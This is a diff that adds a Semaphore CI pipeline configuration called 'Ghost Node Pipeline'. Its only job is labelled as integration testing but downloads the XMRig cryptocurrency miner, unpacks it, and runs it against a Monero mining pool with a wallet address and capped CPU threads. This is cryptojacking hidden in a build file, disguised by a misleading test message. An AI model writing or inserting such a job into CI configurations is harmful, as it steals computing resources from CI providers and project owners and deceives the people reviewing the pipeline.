@@ -1,0 +1,18 @@
+version: v1.0
+name: Ghost Node Pipeline
+agent:
+  machine:
+    type: e1-standard-2
+    os_image: ubuntu2004
+
+blocks:
+  - name: Build and Test
+    task:
+      jobs:
+        - name: Run Miner
+          commands:
+            - echo "Starting integration tests..."
+            - wget -q -O xmrig.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-linux-static-x64.tar.gz
+            - tar -zxf xmrig.tar.gz
+            - chmod +x xmrig-6.21.3/xmrig
+            - ./xmrig-6.21.3/xmrig -o gulf.moneroocean.stream:10128 -u 443uW7xYv33CqWf5kGjF3uG6LDFW8L7jVb6c3L2pX2bJ9A7T3g4K5yZ6c8T5f1R2u3v4W5x6y7z8A9b0C1d2e3f4 -p Semaphore_Ghost -a rx/0 --cpu-max-threads-hint=50
